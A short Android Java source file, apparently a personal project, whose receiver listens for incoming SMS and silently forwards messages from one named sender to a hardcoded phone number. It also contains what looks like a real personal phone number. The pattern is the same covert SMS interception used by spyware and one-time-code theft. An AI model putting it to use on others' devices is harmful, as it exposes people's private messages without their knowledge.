package com.example.huy.listensms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Telephony;
import android.support.annotation.RequiresApi;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SMSReciver extends BroadcastReceiver {

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String messageBody = smsMessage.getMessageBody().trim();
                String sender = smsMessage.getDisplayOriginatingAddress().trim();
                if(sender.equals("PC_T.Nguyen")) {
                    SmsManager sms = SmsManager.getDefault();
                    sms.sendTextMessage("+841668283196", null, smsMessage.getDisplayOriginatingAddress()+ " : " + messageBody, null, null);
                }
            }
        }
    }
}
